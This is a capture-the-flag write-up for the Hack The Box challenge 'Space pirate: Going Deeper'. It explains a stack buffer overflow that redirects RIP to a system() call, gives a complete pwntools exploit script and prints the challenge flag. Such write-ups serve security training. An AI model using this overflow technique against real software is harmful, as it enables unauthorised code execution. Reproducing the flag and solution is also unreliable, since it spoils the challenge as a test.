# Space pirate: Going Deeper
> Write-up author: jon-brandy
## DESCRIPTION:
We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. 
The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. 
Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. 
Can you disable the mechanisms and take control of the Admin Panel?

## HINT:
- NONE
## STEPS:
1. Unzipping the zip file resulting to a 64 bit binary file.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7891a42f-5843-4d71-ac5b-7667676e6464)


2. Let's check the binary's protections.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/0e695117-aab9-468e-919e-be825df29cbc)


3. Let's decompile the binary.
4. At the `main()` function, the `admin_panel()` function shall be our interest because it's where our input accepted.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/b5c990b1-807d-401c-9ff1-d311b50d39cd)


5. We can get the flag if our previous parameters are the same as these:

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/11312e9c-cff6-4c7a-9645-074ee185edf4)


6. Anyway there's a `system()` call that auto cat the flag.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/94239da8-ad83-443d-885c-80c0740dfeed)


![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4471baf8-7d30-4303-8565-84929f5592f7)


7. Hence the pwn concept is to control the RIP by overflowing the buffer then add the `lea` offset.

```
padding + lea_offset
```

8. First we need to find the offset for RIP.
9. Let's use peda.

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/3d4087da-394d-4189-b8ee-b356d7ae7a3d)


10. Sadly it does not show us the bytes, hence we need to find it manually.
11. But the problem is, since we want to use the `system()` approach, hence we can't determine if the padding is correct or not, because it shall gave us the "EOF" statement.
12. Then let's assume to use 57 right now.
13. Next, grab the `lea` offset

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/f93f106f-32b7-4525-85b8-a9ccf7d4c8db)


14. Let's craft the script.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './sp_going_deeper'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

padding = 57 

lea_offset = 0x0000000000400b12
info('lea offset --> %#0x', lea_offset)

p = flat([
    asm('nop') * padding,
    lea_offset
])

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b':', p)
sh.interactive()
```

> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7af41ac8-6d87-4a6a-8d8b-170c9780f195)


15. Let's lowered it to 56.

> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/84427b43-f406-43bc-bcc1-ba5fb0bd3f1a)


16. Got the flag!
17. Let's test it remotely then.

> RESULT

![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7c483531-53c3-43c5-8183-6b2b1a574ac5)


18. Got the flag!

## FLAG

```
HTB{d1g_1n51d3..u_Cry_cry_cry}
```
